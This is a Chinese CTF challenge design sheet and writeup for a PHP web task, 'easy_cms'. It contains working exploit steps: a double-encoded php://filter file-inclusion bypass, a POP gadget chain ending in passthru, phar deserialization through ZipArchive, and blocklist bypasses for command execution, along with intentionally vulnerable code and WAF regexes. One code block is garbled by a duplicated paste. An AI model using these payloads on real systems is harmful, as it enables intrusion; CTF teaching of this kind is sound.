# CTF赛题设计说明
### [题目信息]：
出题人|出题时间|题目名字|题目类型|难度等级|题目分值
:-|:-|:-|:-|:-|:-
Y4tacker|20210410|easy_cms|web|中上|500

### [题目描述]：
```
小Y最近写了一个CMS，他自信满满觉得没有漏洞，可学长一下就给他拿下了
```

### [题目考点]：
```
1. robots.txt泄露|sqlite数据库泄露
2. class目录任意文件读（配合include会url解码伪协议绕过过滤）
3. popchain构造
4. phar反序列化(原生类Ziparchieve的使用)
5. 绕过过滤执行系统命令
6. 代码审计
```

### [是否原创]：
```
是：原创
```

### [Flag]:
自行在环境变量里设置，在docker-compose.yml设置

### [题目环境]：
```
1. php:7.4-fpm-alpine
```

### [特别注意]：
```
无
```

### [题目writeup]：
开局一个游戏

首先访问robots.txt

```
Disallow: /h1nt.php
```

页面会打印出

```
database_type:sqlite
database_file:db/user.db3
```

下载得到user.db3文件由此拿到密码

进去后发现头像部分url为`class/showImage.php?file=logo.jpg`

猜测存在任意文件读，去掉后缀以后，得到源码

```php
<?php

error_reporting(0);
if ($_GET['file']){
    $filename = $_GET['file'];
    if ($filename=='logo.jpg'){
        header("Content-Type:image/png");
        echo file_get_contents("../static/images/logo.jpg");
    }else{
        ini_set('open_basedir','./');
        if ($filename=='hint.php'){
            echo 'nononono!';
        } else{
            if(preg_match('/read|[\x00-\x24\x26-\x2c]| |base|rot|strip|encode|flag|tags|iconv|utf|input|convertstring|lib|crypt|\.\.|\.\//i', $filename)){
                echo "hacker";
            }else{
                include($filename);
            }
        }
    }
}else{
    highlight_file(__FILE__);
}
```

尝试用伪协议读文件，可是发现过滤的很严格，但是放出了`%25`也就是`%`，配合文件包含函数的url解码可以桡过，过滤了read，其实可以直接忽略因为是等价的

因此构造payload

```
?file=php://filter/conv%6%35rt.bas%6%3564-%6%35ncode/resource=hint.php
```

解码发现了文件目录树

```
<?php
//以下是class目录结构
/*
- class
    -- cache
    -- tempaltes
        --- api
            - Api.php
        ---admin
            -add_category.php
            -category_list.php
            -edit_category.php
            -admin.php
            -footer.php
            -header.php
            -left.php
        - login.php
        - index.php
        - api.php
    -- auth.php
    -- file_class.php
    -- hint.php
    -- Medoo.php
    -- render_file.php
    -- showImage.php
    -- log.php
*/
```

读取文件后开始代码审计，最后通过构造popchain

```
UserInfo->SuperAdmin->ExportExcel
```

```
class UserInfo
{
    public $username;
    public $nickname;
    public $role;
    public $userFunc;

    public function __construct($username, $nickname, $userFunc, $role = '')
    {
        $this->username = new SuperAdmin("1", "1");;
        $this->nickname = $nickname;
        $this->userFunc = $userFunc;
        $this->role = $role;
    }

}

class SuperAdmin
{
    public $username;
    public $role;
    public $isSuperAdmin;
    public $OwnMember;

    public function __construct($username, $OwnMember, $superAdmin = '', $role = '')
    {
        $this->username = $username;
        $this->OwnMember = $OwnMember;
        $this->isSuperAdmin = new ExportExcel("whoami", "b", "passthru");;
        $this->role = $role;
    }

}

class ExportExcel
{

    public $filename;
    public $exportname;
    public $do;

    public function __construct($filename, $exportname, $do)
    {
        $this->filename = $filename;
        $this->exportname = $exportname;
        $this->do = $do;
    }


}
```

通过登录处可控制日志文件写入phar后，发现admin.php泄露日志地址

```
、<li style="font-size: 20px;">上次登录时间：<?php $a = new renderUtil("",Log,empty($_POST['file'])?"./class/cache/lastTime.txt":$_POST['file']);echo $a;?></li>

```

并且renderUtil的destrcu方法的extractZip方法看出可以执行phar反序列化利用

```
public static function extractZip($file,$content){
        $zip = new ZipArchive();
        $res = $zip->open($file);
        if ($res){
            $zip->extractTo($content);
        }else{
            echo 'no ZipFile';
        }
        $zip->close();
    }xxxxxxxxxx public static function extractZip($file,$content){        $zip = new ZipArchive();        $res = $zip->open($file);        if ($res){            $zip->extractTo($content);        }else{            echo 'no ZipFile';        }        $zip->close();    }public function __destruct(){        if (!empty($this->file)){            $ret = $this->file->open($this->filename,$this->content);        }        if (!empty($ret)){            fileUtil::extractZip($this->filename, $this->content);        }    }
```

执行命令发现根目录存在`/flagg`，文件读取命令大多被禁用了，但是可以利用编程语言特性绕过，比如python，php，这里直接`php /flagg`相当于是include

```
function wudiWaf($name){
    if(preg_match('/system|call|proc|ob|mail|put|env|dl|ini|exec|array|create|_|ch|op|log|link|pcntl|imap|cat|tac|>|more|less|head|tail|nl|sort|od|base|awk|cut|grep|uniq|string|sh|sed|rev|zip|\\\\|py|[\x01-\x19]|\*|\?/',$name)){
        die("NO");
    }else{
        return true;
    }
}
```

访问`?page=admin&c=admin`
post数据，即可拿到flag

```
file=phar://./class/cache/lastTime.txt/test.txt
```

